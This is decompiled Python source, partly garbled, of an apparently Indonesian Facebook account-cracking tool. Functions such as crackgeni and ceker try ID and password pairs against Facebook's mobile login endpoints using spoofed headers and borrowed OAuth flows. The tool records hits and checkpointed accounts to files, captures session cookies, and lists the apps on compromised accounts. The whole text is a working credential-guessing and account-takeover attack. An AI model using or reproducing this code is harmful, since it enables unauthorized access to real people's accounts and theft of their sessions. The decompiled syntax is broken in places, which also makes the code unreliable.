                    p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=141595129234543&kid_directed_site=0&app_id=141595129234543&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv5.0%2Fdialog%2Foauth%3Fclient_id%3D141595129234543%26redirect_uri%3Dhttps%253A%252F%252Fibispaint.com%252Flogin.jsp%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De8184574-7e8f-41f3-b6d5-47a6c13f68fd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fibispaint.com%2Flogin.jsp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
                    dataa = {
                        'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                        'uid': idf,
                        'next': 'https://developers.facebook.com/tools/debug/accesstoken/',
                        'flow': 'login_no_pin',
                        'pass': pw }
                    koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
                    koki += ' m_pixel_ratio=2.625; wd=412x756'
                    headers = 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
                    po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, allow_redirects = False)
                    if 'checkpoint' in po.cookies.get_dict().keys():
                        print(f'''\r[{K}CP{N}] {idf}|{pw}\n>> {u}{ua}{N}''')
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                        'accept-language'
                    if 'c_user' in ses.cookies.get_dict().keys():
                        ok += 1
                        coki = po.cookies.get_dict()
                        kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
                        print(f'''\r[OK] {h}{idf}|{pw}\n>> {kuki}\n>> {u}{ua}{N}''')
                        open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
                        cek_apk(session, coki)
                        ';'.join
                    if requests.exceptions.ConnectionError:
                        'gzip, deflate, br'
                        time.sleep(31)
                    loop += 1
                    return None

            
            def crackgeni(idf, pwv):
                global cp, ok, loop
                bo = random.choice([
                    m,
                    k,
                    h,
                    b,
                    u,
                    x])
                (sys.stdout.write(f'''\rM3 {P}[{b}{loop}{P}/{u}{len(id)}{P}]â€”{P}[{H}{ok}{P}]â€”{P}[{k}{cp}{x}]â€”[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
                sys.stdout.flush()
                ua = random.choice(ugen)
                ua2 = random.choice(ugen2)
                ses = requests.Session()
                for pw in pwv:
                    ses.headers.update({
                        'Host': 'd.facebook.com',
                        'upgrade-insecure-requests': '1',
                        'user-agent': ua2,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'dnt': '1',
                        'x-requested-with': 'mark.via.gp',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-user': 'empty',
                        'sec-fetch-dest': 'document',
                        'referer': 'https://m.facebook.com/',
                        'accept-encoding': 'gzip, deflate br',
                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                    p = ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
                    dataa = {
                        'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                        'uid': idf,
                        'flow': 'login_no_pin',
                        'pass': pw,
                        'next': 'https://developers.facebook.com/tools/debug/accesstoken/' }
                    ses.headers.update({
                        'Host': 'd.facebook.com',
                        'cache-control': 'max-age=0',
                        'upgrade-insecure-requests': '1',
                        'origin': 'https://m.facebook.com',
                        'content-type': 'application/x-www-form-urlencoded',
                        'user-agent': ArifMemek,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'x-requested-with': 'mark.via.gp',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-user': 'empty',
                        'sec-fetch-dest': 'document',
                        'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
                        'accept-encoding': 'gzip, deflate br',
                        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
                    po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, allow_redirects = False)
                    if 'checkpoint' in po.cookies.get_dict().keys():
                        print(f'''\r[{K}CP{N}] {idf}|{pw}\n>> {u}{ua}{N}''')
                        open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                        akun.append(idf + '|' + pw)
                        cp += 1
                    if 'c_user' in ses.cookies.get_dict().keys():
                        ok += 1
                        coki = po.cookies.get_dict()
                        kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
                        print(f'''\r[OK] {h}{idf}|{pw}\n>> {kuki}\n>> {u}{ua}{N}''')
                        open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + ua + '\n')
                        cek_apk(session, coki)
                        ';'.join
                    if requests.exceptions.ConnectionError:
                        time.sleep(31)
                    loop += 1
                    return None

            
            def ceker(idf, pw):
                global cp, cp
                ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
                head = {
                    'Host': 'mbasic.facebook.com',
                    'cache-control': 'max-age=0',
                    'upgrade-insecure-requests': '1',
                    'origin': 'https://mbasic.facebook.com',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': ua,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'x-requested-with': 'mark.via.gp',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-user': '?1',
                    'sec-fetch-dest': 'document',
                    'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                    'accept-encoding': 'gzip, deflate',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                ses = requests.Session()
                hi = ses.get('https://mbasic.facebook.com')
                ho = sop(ses.post('https://mbasic.facebook.com/login.php', data = {
                    'email': idf,
                    'pass': pw,
                    'login': 'submit' }, headers = head, allow_redirects = True).text, 'html.parser')
                jo = ho.find('form')
                data = { }
                lion = [
                    'nh',
                    'jazoest',
                    'fb_dtsg',
                    'submit[Continue]',
                    'checkpoint_data']
                for anj in jo('input'):
                    if anj.get('name') in lion:
                        data.update({
                            anj.get('name'): anj.get('value') })
                    kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data = data, headers = head).text, 'html.parser')
                    print(f'''\r{b!s}++++ {idf!s}|{pw!s} ----> CP       {x!s}''')
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    cp += 1
                    opsi = kent.find_all('option')
                    if len(opsi) == 0:
                        print(f'''\r{hh!s}---> Tap Yes / A2F (Cek Login Di Lite/Mbasic{x!s})''')
                        return None
                    for opsii in None:
                        print(f'''\r{kk!s}---> {opsii.text!s}{x!s}''')
                        return None
                        if Exception:
                            c = None
                            print(f'''\r{b!s}++++ {idf!s}|{pw!s} ----> CP       {x!s}''')
                            print(f'''\r{u!s}---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic){x!s}''')
                            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                            cp += 1
                            c = None
                            del c
                            return None
                        c = None
                        del c

            
            def cek_opsi():
                c = len(akun)
                hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu' % c
                cetak(nel(hu, title = 'CEK OPSI'))
                input(x + '[' + h + 'â€¢' + x + '] Mulai')
                cek = '# PROSES CEK OPSI DIMULAI'
                sol().print(mark(cek, style = 'green'))
                love = 0
                for kes in akun:
                    pw = kes.split('|')[1]
                    id = kes.split('|')[0]
                    if IndexError:
                        time.sleep(2)
                        print(f'''\r{b!s}++++ {kes!s} ----> Error      {x!s}''')
                        print(f'''\r{u!s}---> Pemisah Tidak Didukung Untuk Program Ini{x!s}''')
                    bi = random.choice([
                        u,
                        k,
                        kk,
                        b,
                        h,
                        hh])
                    print(f'''\r{bi!s}---> {love!s}/{len(akun)!s} ---> {{ {id!s} }}{x!s}''', end = ' ')
                    sys.stdout.flush()
                    ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
                    ses = requests.Session()
                    header = {
                        'Host': 'mbasic.facebook.com',
                        'cache-control': 'max-age=0',
                        'upgrade-insecure-requests': '1',
                        'origin': 'https://mbasic.facebook.com',
                        'content-type': 'application/x-www-form-urlencoded',
                        'user-agent': ua,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                        'x-requested-with': 'mark.via.gp',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'sec-fetch-dest': 'document',
                        'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
                        'accept-encoding': 'gzip, deflate',
                        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
                    hi = ses.get('https://mbasic.facebook.com')
                    ho = sop(ses.post('https://mbasic.facebook.com/login.php', data = {
                        'email': id,
                        'pass': pw,
                        'login': 'submit' }, headers = header, allow_redirects = True).text, 'html.parser')
                    if 'checkpoint' in ses.cookies.get_dict().keys():
                        jo = ho.find('form')
                        data = { }
                        lion = [
                            'nh',
                            'jazoest',
                            'fb_dtsg',
                            'submit[Continue]',
                            'checkpoint_data']
                        for anj in jo('input'):
                            if anj.get('name') in lion:
                                data.update({
                                    anj.get('name'): anj.get('value') })
                            kent = sop(ses.post('https://mbasic.facebook.com' + str(jo['action']), data = data, headers = header).text, 'html.parser')
                            print(f'''\r{b!s}++++ {id!s}|{pw!s} ----> CP       {x!s}''')
                            opsi = kent.find_all('option')
                            if len(opsi) == 0:
                                print(f'''\r{hh!s}---> Tap Yes / A2F (Cek Login Di Lite/Mbasic{x!s})''')
                        for opsii in opsi:
                            print(f'''\r{kk!s}---> {opsii.text!s}{x!s}''')
                            print(f'''\r{b!s}++++ {id!s}|{pw!s} ----> CP       {x!s}''')
                            print(f'''\r{u!s}---> Tidak Dapat Mengecek Opsi{x!s}''')
                            if 'c_user' in ses.cookies.get_dict().keys():
                                print(f'''\r{h!s}++++ {id!s}|{pw!s} ----> OK       {x!s}''')
                    print(f'''\r{x!s}++++ {id!s}|{pw!s} ----> SALAH       {x!s}''')
                    love += 1
                    if requests.exceptions.ConnectionError:
                        print('')
                        li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
                        sol().print(mark(li, style = 'red'))
                        exit()
                    dah = '# DONE'
                    sol().print(mark(dah, style = 'green'))
                    exit()
                    return None

            
            def cek_apk(session, cookie):
                w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=active', cookies = {
                    'cookie': cookie }).text
                sop = BeautifulSoup(w, 'html.parser')
                x = sop.find('form', method = 'post')
                game = x.find_all('h3')()
                if len(game) == 0:
                    print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.''')
                for i in range(len(game)):
                    print(f'''   {H!s}{i + 1!s}. {game[i].replace('Ditambahkan pada', ' Ditambahkan pada')!s}{N!s}''')
                    w = session.get('https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive', cookies = {
                        'cookie': cookie }).text
                    sop = BeautifulSoup(w, 'html.parser')
                    x = sop.find('form', method = 'post')
                    game = x.find_all('h3')()
                    if len(game) == 0:
                        print(f'''\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.''')
                        return None
                    for i in (lambda .0: for i in .0:
[ i.text ])(len(game)):
                        print(f'''   {K!s}{i + 1!s}. {game[i].replace('Kedaluwarsa', ' Kedaluwarsa')!s}{N!s}''')
                        return None

            if __name__ == '__main__':
                os.system('git pull')
                os.mkdir('OK')
                os.mkdir('CP')
                os.mkdir('DUMP')
                os.system('touch .prox.txt')
                login()
                return None
            return None
